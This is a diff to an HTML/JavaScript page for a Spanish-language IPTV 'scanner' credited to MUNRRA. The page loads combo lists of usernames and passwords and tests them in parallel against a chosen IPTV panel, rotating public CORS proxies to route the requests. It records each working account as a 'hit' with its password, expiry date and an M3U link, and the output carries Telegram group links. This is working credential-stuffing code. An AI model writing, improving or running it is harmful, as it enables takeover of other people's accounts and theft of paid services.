@@ -967,7 +967,7 @@
             </div>
         </div>
 
-        <!-- PANEL SCANNER (NUEVO ESCÁNER INTEGRADO) -->
+        <!-- PANEL SCANNER (con lógica original de MUNRRA corregida) -->
         <div id="panel-scanner" class="panel">
             <div class="form-group">
                 <label>Panel (Host con o sin http/https):</label>
@@ -1774,34 +1774,60 @@
         });
 
         // ======================================================================
-        // ========== NUEVO ESCÁNER AVANZADO (MULTI-JOB + PROXIES + SONIDO) ==========
+        // ========== ESCÁNER (código original de MUNRRA, corregido) ==========
         // ======================================================================
 
-        // ---- Textos fijos en español (reemplaza i18n) ----
-        const lang = {
-            title: "SYS ANDY PRO",
-            ip: "IP",
-            host: "Host",
-            port: "Puerto",
-            user: "Usuario",
-            pass: "Contraseña",
-            created: "Creada",
-            expires: "Expira",
-            status: "Estado",
-            statusActive: "Activo",
-            statusUnknown: "Desconocido",
-            maxConn: "Conexiones máximas",
-            actConn: "Conexiones activas",
-            categories: "📺 Categorías IPTV:",
-            none: "N/D",
-            link: "🔗 Enlace M3U",
-            categoriesRule: "━━━━━━━━━━━━━━━",
-            more: "más",
-            groupsA: "",
-            groupsB: ""
+        // ---- Textos fijos en español (igual que en MUNRRA) ----
+        const i18n = {
+            es: {
+                hostLabel: "Panel (host con o sin http/https):",
+                hostPH: "ej: lista.com:8080",
+                comboLabel: "Elige archivo .txt con combos (user:pass):",
+                comboTextLabel: "…o pegar combos (texto libre)",
+                concLabel: "Número de conexiones paralelas (bots):",
+                useCors: "Usar proxy CORS",
+                sound: "🔔 Sonido al encontrar hit",
+                autoDL: "⬇️ Descargar resultados al finalizar",
+                start: "Iniciar Scan",
+                stop: "Detener Scan",
+                save: "Guardar en el teléfono (.txt)",
+                waiting: "Esperando inicio...",
+                resolving: "Resolviendo IP...",
+                starting: "Iniciando scan...",
+                currentUser: "Usuario actual",
+                processed: "Procesados",
+                hitsFound: "Hits encontrados",
+                scanStopped: " | Scan detenido.",
+                scanDone: " | Scan finalizado.",
+                noHits: "No hay hits",
+                footer: "Hecho por MUNRRA",
+                title: "SYS ANDY PRO",
+                ip: "IP",
+                host: "Host",
+                port: "Puerto",
+                user: "Usuario",
+                pass: "Contraseña",
+                created: "Creada",
+                expires: "Expira",
+                status: "Estado",
+                statusActive: "Activo",
+                statusUnknown: "Desconocido",
+                maxConn: "Conexiones máximas",
+                actConn: "Conexiones activas",
+                categories: "📺 IPTV Categories:",
+                none: "N/D",
+                link: "🔗Link M3U",
+                groupsA: "🗣Grupo: https://t.me/+japhlpdroyYzYWJk",
+                groupsB: "🗣Grupo: https://t.me/+XmT5CjFVOIJmNjc0",
+                categoriesRule: "━━━━━━━━━━━━━━━",
+                more: "más"
+            }
         };
+        const LANG = 'es';
 
-        function t(key) { return lang[key] || key; }
+        function t(key) {
+            return (i18n[LANG] && i18n[LANG][key]) ?? key;
+        }
 
         // ---- Utilidades ----
         function randomUA() {
@@ -1835,7 +1861,7 @@
         }
 
         // ---- Fetch con timeout ----
-        async function fetchTimeout(url, opts = {}, ms = 7000) {
+        async function fetchTimeout(url, opts = {}, ms = 6000) {
             const controller = new AbortController();
             const id = setTimeout(() => { controller.abort(); }, ms);
             try {
@@ -1848,37 +1874,16 @@
             }
         }
 
-        // ---- Proxies CORS con circuit breaker ----
+        // ---- Proxies CORS con circuit breaker (lista original de MUNRRA) ----
         const CORS_PROXIES = [
+            'https://cors.isomorphic-git.org/{url}',
+            'https://thingproxy.freeboard.io/fetch/{url}',
             'https://api.allorigins.win/raw?url={url}',
             'https://corsproxy.io/?{url}',
             'https://api.codetabs.com/v1/proxy/?quest={url}',
-            'https://cors-anywhere.herokuapp.com/{url}',
-            'https://proxy.cors.sh/{url}',
-            'https://cors.eu.org/{url}',
-            'https://cors-proxy.htmldriven.com/?url={url}',
-            'https://thingproxy.freeboard.io/fetch/{url}',
-            'https://cors.zme.ink/{url}',
-            'https://cors.ninja/{url}',
-            'https://cors.iry.dev/{url}',
-            'https://api.cors.lol/?url={url}',
-            'https://cors-proxy.elfsight.com/?url={url}',
-            'https://blooming-shelf-78862.herokuapp.com/{url}',
-            'https://aqueous-reef-74995.herokuapp.com/{url}',
-            'https://cors-proxy.fly.dev/{url}',
-            'https://cors.shuttleapp.rs/{url}',
-            'https://cors-proxy.onrender.com/{url}',
-            'https://cors.isomorphic-git.org/{url}',
             'https://yacdn.org/proxy/{url}',
             'https://api.s0n1c.org/cors?url={url}',
-            'https://cors.bridged.cc/{url}',
-            'https://crossorigin.me/{url}',
-            'https://cors.5apps.com/{url}',
-            'https://cors.io/?{url}',
-            'https://proxy.kinesis.pro/{url}',
-            'https://cors-proxy-9d1l.onrender.com/{url}',
-            'https://cors.olimox.workers.dev/?{url}',
-            'https://cors-relay.vercel.app/api?url={url}'
+            'https://api.scraperapi.com/?url={url}'
         ];
 
         const PROXY_FAILS = new Map();
@@ -1904,15 +1909,11 @@
             PROXY_FAILS.delete(tpl);
         }
 
-        function proxify(tpl, targetUrl) {
-            return tpl.includes('{url}') ? tpl.replace('{url}', encodeURIComponent(targetUrl)) : (tpl + targetUrl);
-        }
-
-        // ---- Fetch con CORS y rotación ----
+        // ---- Función fetchWithCors exacta de MUNRRA ----
         async function fetchWithCors(url, options = {}, jobId = null) {
             const baseOpts = { cache: 'no-store', keepalive: false, ...options };
 
-            // 1) Proxy fijo del job si existe y no está frío
+            // 1) Proxy fijo del job
             if (jobId && JOB_PROXIES[jobId]) {
                 const fixedTpl = JOB_PROXIES[jobId];
                 if (!proxyIsCold(fixedTpl)) {
@@ -1925,7 +1926,7 @@
                 }
             }
 
-            // 2) Intento directo (si CORS lo permite)
+            // 2) Intento directo
             try {
                 const r = await fetchTimeout(url, baseOpts);
                 if (r && r.ok) return r;
@@ -1951,7 +1952,7 @@
 
         async function getJson(url, options = {}, jobId = null) {
             const r = await fetchWithCors(url, options, jobId);
-            if (!r.ok) throw new Error('Bad response');
+            if (!r.ok) throw new Error('Bad');
             return await r.json();
         }
 
@@ -2047,43 +2048,54 @@
             const pct = total === 0 ? 0 : (processed / total) * 100;
             if (ui.fill) ui.fill.style.width = pct + '%';
             if (ui.text) ui.text.textContent =
-                `Procesados: ${processed} / ${total} | Hits: ${ui.hitsArr.length}`;
+                `${t('processed')}: ${processed} / ${total} | ${t('hitsFound')}: ${ui.hitsArr.length}`;
             if (ui.hitsCountEl) ui.hitsCountEl.innerHTML =
-                `Hits: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
+                `${t('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
         }
 
-        // ---- Mostrar hit ----
+        // ---- Mostrar hit (usa la función de sonido y guardado de la página) ----
         function mostrarHit(hit, ui) {
             const div = document.createElement('div');
             div.className = 'hit-block';
             const header = document.createElement('div');
             header.className = 'hit-header';
-            header.textContent = `👤 ${hit.user} : ${hit.pass}`;
+            header.textContent = `${t('user')}: ${hit.user} | ${t('pass')}: ${hit.pass}`;
             const content = document.createElement('pre');
             content.className = 'hit-content';
             content.textContent = hit.texto;
             div.appendChild(header);
             div.appendChild(content);
+
+            // Añadir al container global
             document.getElementById('hitsContainer').prepend(div);
 
+            // Actualizar contador del job
             if (ui.hitsCountEl) {
                 ui.hitsCountEl.innerHTML =
-                    `Hits: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
+                    `${t('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
             }
-            // Sonido de gemido (usamos la función existente)
+
+            // Sonido (usamos la función playMoanSound que ya existe en la página)
             if (typeof playMoanSound === 'function') playMoanSound();
-            // Guardar en banco
-            if (typeof guardarHitEnBanco === 'function') guardarHitEnBanco(hit.texto, hit.user, hit.pass);
+            else {
+                // fallback: intentar con la función de sonido original de MUNRRA si existe
+                if (typeof playHitSound === 'function') playHitSound();
+            }
+
+            // Guardar en el banco de hits (función de la página)
+            if (typeof guardarHitEnBanco === 'function') {
+                guardarHitEnBanco(hit.texto, hit.user, hit.pass);
+            }
         }
 
-        // ---- Validar combo contra panel ----
+        // ---- Validar combo (exactamente igual a MUNRRA) ----
         async function validarCombo(host, combo, opts = {}, session = null, ui = null, jobId = null) {
             try {
                 if (stopRequested) return null;
                 const pair = Array.isArray(combo) ? combo : extractCombo(combo);
                 if (!pair) return null;
                 const [user, pass] = pair;
-                if (ui && ui.user) { ui.user.textContent = `Usuario: ${user}:${pass}`; }
+                if (ui && ui.user) { ui.user.textContent = `${t('currentUser')}: ${user}:${pass}`; }
 
                 const protos = ['http://', 'https://'];
                 let data = null,
@@ -2101,10 +2113,10 @@
                 if (!data) return null;
 
                 const uinfo = data.user_info || {};
-                const ok = (uinfo.status === 'Active') ||
+                const ok = (uinfo.status === t('statusActive')) ||
                     String(uinfo.auth) === '1' ||
                     String(uinfo.auth).toLowerCase() === 'true' ||
-                    uinfo.status === 'Activo';
+                    uinfo.status === 'Active';
                 if (!ok) return null;
 
                 let liveCatsText = `${t('categoriesRule')}\n• ${t('none')}`;
@@ -2117,32 +2129,35 @@
 
                 const porta = host.includes(':') ? host.split(':')[1] : (usedProto === 'https://' ? '443' : '80');
                 const hostSem = host.includes(':') ? host.split(':')[0] : host;
-                const creada = uinfo.created_at ? new Date(uinfo.created_at * 1000).toLocaleDateString('es-ES') : t('none');
+                const creada = uinfo.created_at ? new Date(uinfo.created_at * 1000).toLocaleDateString('es-ES') : t(
+                'none');
                 const expira = uinfo.exp_date ? new Date(uinfo.exp_date * 1000).toLocaleDateString('es-ES') : t('none');
                 const status = uinfo.status || (String(uinfo.auth) === '1' ? t('statusActive') : t('statusUnknown'));
-                const statusEmoji = (status === 'Active' || status === 'Activo' || status === t('statusActive')) ? '✅' :
+                const statusEmoji = (status === t('statusActive') || status === 'Active' || status === 'Activo') ? '✅' :
                 '❌';
                 const maxConns = (uinfo.max_connections ?? uinfo.max_cons ?? uinfo['max_connections']) ?? t('none');
-                const activeCons = (uinfo.active_cons ?? uinfo.connected_cons ?? uinfo['active_connections']) ?? t('none');
-                const locLine = serverGeo ? `\n🌍 IP: ${serverGeo.ip}\n${serverGeo.flag} ${serverGeo.city}, ${serverGeo.country}` :
+                const activeCons = (uinfo.active_cons ?? uinfo.connected_cons ?? uinfo['active_connections']) ?? t(
+                'none');
+                const locLine = serverGeo ? `\n🌍 ${t('ip')}: ${serverGeo.ip}\n${serverGeo.flag} ${serverGeo.city}, ${serverGeo.country}` :
                     '';
                 const link =
                     `${usedProto}${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
 
-                const texto =
-                    `${t('title')}${locLine}
-🌐 Host: ${hostSem}
-🚪 Puerto: ${porta}
-👤 Usuario: ${user}
-🔑 Contraseña: ${pass}
-📅 Creada: ${creada}
-⏳ Expira: ${expira}
-${statusEmoji} Estado: ${status}
-👥 Conexiones máximas: ${maxConns}
-🔌 Conexiones activas: ${activeCons}
+                const texto = `${t('title')}${locLine}
+🌐${t('host')}: ${hostSem}
+🚪${t('port')}: ${porta}
+👤${t('user')}: ${user}
+🔑${t('pass')}: ${pass}
+📅${t('created')}: ${creada}
+⏳${t('expires')}: ${expira}
+${statusEmoji}${t('status')}: ${status}
+👥 ${t('maxConn')}: ${maxConns}
+🔌 ${t('actConn')}: ${activeCons}
 ${t('categories')}
 ${liveCatsText}
-${t('link')}: ${link}`;
+${t('link')}: ${link}
+${t('groupsA')}
+${t('groupsB')}`;
 
                 return { texto, user, pass, host };
             } catch { return null; }
@@ -2152,13 +2167,14 @@ ${t('link')}: ${link}`;
         async function processarCombosJob(host, combos, conc, jobId) {
             const ui = uiFor(jobId);
             ui.hitsArr.length = 0;
-            if (ui.hitsCountEl) ui.hitsCountEl.innerHTML = `Hits: <span class="yellow-hit">0</span>`;
+            if (ui.hitsCountEl) ui.hitsCountEl.innerHTML =
+                `${t('hitsFound')}: <span class="yellow-hit">0</span>`;
             if (ui.fill) ui.fill.style.width = '0%';
 
             let total = combos.length,
                 processed = 0;
-            if (ui.text) ui.text.textContent = 'Esperando...';
-            if (ui.user) ui.user.textContent = `Usuario actual: -`;
+            if (ui.text) ui.text.textContent = t('waiting');
+            if (ui.user) ui.user.textContent = `${t('currentUser')}: -`;
             actualizarProgresoJob({ processed, total }, ui);
 
             conc = Math.max(1, Math.min(100, conc | 0));
@@ -2173,7 +2189,7 @@ ${t('link')}: ${link}`;
                     if (i >= total) break;
                     const combo = combos[i];
                     if (!combo) continue;
-                    if (ui.user) ui.user.textContent = `Usuario: ${combo}`;
+                    if (ui.user) ui.user.textContent = `${t('currentUser')}: ${combo}`;
 
                     let opts = { headers: { ...session.headers } };
                     opts = attachCookies(opts, session);
@@ -2195,15 +2211,15 @@ ${t('link')}: ${link}`;
                 }
             }
 
-            if (ui.text) ui.text.textContent = 'Iniciando scan...';
+            if (ui.text) ui.text.textContent = t('starting');
             await sleep((jobId - 1) * 100);
             await Promise.all(Array.from({ length: conc }, () => worker()));
 
-            if (ui.user) ui.user.textContent = `Usuario actual: -`;
-            if (ui.text) ui.text.textContent += (stopRequested ? ' | Scan detenido.' : ' | Scan finalizado.');
+            if (ui.user) ui.user.textContent = `${t('currentUser')}: -`;
+            if (ui.text) ui.text.textContent += (stopRequested ? t('scanStopped') : t('scanDone'));
         }
 
-        // ---- Guardar resultados ----
+        // ---- Guardar resultados (funciones auxiliares) ----
         function dedupeHits(arr) {
             const seen = new Set();
             const out = [];
@@ -2260,7 +2276,7 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
         async function saveHitsAll(rawHost, { allowEmpty = false, groupByJob = true, dedupe = true } = {}) {
             const content = buildHitsTextAll({ groupByJob, dedupe });
             if (!content && !allowEmpty) {
-                alert("No hay hits para guardar.");
+                alert(t('noHits'));
                 return;
             }
             const blob = new Blob([content || ''], { type: 'text/plain;charset=utf-8' });
@@ -2304,7 +2320,7 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
         document.getElementById('comboFile3').addEventListener('change', () => readTxtFile(document.getElementById(
             'comboFile3'), combos3));
 
-        document.getElementById('comboText')?.addEventListener('input', () => {
+        document.getElementById('comboText').addEventListener('input', () => {
             combosTxt.length = 0;
             const raw = document.getElementById('comboText').value || '';
             if (raw) {
@@ -2319,7 +2335,7 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
 
         document.getElementById('hostInput').addEventListener('input', updateStartState);
 
-        // ---- Botón START ----
+        // ---- Botón START (exactamente igual a MUNRRA) ----
         document.getElementById('startBtn').addEventListener('click', async () => {
             if (isRunning) return;
 
@@ -2335,7 +2351,7 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
             if (hitsContainer) hitsContainer.textContent = '';
             [document.getElementById('hitsCount1'), document.getElementById('hitsCount2'), document.getElementById(
                 'hitsCount3')].forEach(el => {
-                if (el) el.innerHTML = `Hits: <span class="yellow-hit">0</span>`;
+                if (el) el.innerHTML = `${t('hitsFound')}: <span class="yellow-hit">0</span>`;
             });
             Object.values(HITS).forEach(arr => arr.length = 0);
 
@@ -2346,11 +2362,11 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
             });
             ['progressText', 'progressText2', 'progressText3'].forEach(id => {
                 const el = document.getElementById(id);
-                if (el) el.textContent = 'Resolviendo IP...';
+                if (el) el.textContent = t('resolving');
             });
             ['currentCombo', 'currentCombo2', 'currentCombo3'].forEach(id => {
                 const el = document.getElementById(id);
-                if (el) el.textContent = 'Usuario actual: -';
+                if (el) el.textContent = `${t('currentUser')}: -`;
             });
 
             const host = document.getElementById('hostInput').value.replace(/^https?:\/\//, '').trim();
@@ -2367,7 +2383,7 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
                 document.getElementById('comboText').value = '';
             }
 
-            // Asignar proxies fijos por job
+            // Asignar proxies fijos por job (igual que MUNRRA)
             JOB_PROXIES = {};
             const shuffled = [...CORS_PROXIES].sort(() => Math.random() - 0.5);
             const activeJobs = [combos1.length > 0, combos2.length > 0, combos3.length > 0].filter(Boolean).length || 1;
@@ -2415,7 +2431,7 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
             document.getElementById('stopBtn').disabled = true;
             ['progressText', 'progressText2', 'progressText3'].forEach(id => {
                 const el = document.getElementById(id);
-                if (el) el.textContent += ' | Scan detenido.';
+                if (el) el.textContent += t('scanStopped');
             });
         });
 
@@ -2577,6 +2593,31 @@ Total (bruto): ${total} | Después de deduplicar: ${totalAfter}
             document.getElementById('replyBadge').style.display = 'none'; });
 
         function cargarMensajesChat() {}
+
+        // ---- Función de sonido (usada por el escáner) ----
+        let moanAudioContext = null;
+
+        function playMoanSound() {
+            if (!document.getElementById('soundToggle').checked) return;
+            try {
+                if (!moanAudioContext) moanAudioContext = new(window.AudioContext || window.webkitAudioContext)();
+                if (moanAudioContext.state === 'suspended') moanAudioContext.resume();
+                const now = moanAudioContext.currentTime;
+                const osc = moanAudioContext.createOscillator();
+                const gain = moanAudioContext.createGain();
+                osc.connect(gain);
+                gain.connect(moanAudioContext.destination);
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(400, now);
+                osc.frequency.exponentialRampToValueAtTime(800, now + 0.15);
+                osc.frequency.exponentialRampToValueAtTime(300, now + 0.35);
+                gain.gain.setValueAtTime(0.3, now);
+                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.8);
+                osc.start();
+                osc.stop(now + 0.8);
+                if (navigator.vibrate) navigator.vibrate(200);
+            } catch (e) { console.log("Audio error", e); }
+        }
     </script>
 
 </body>
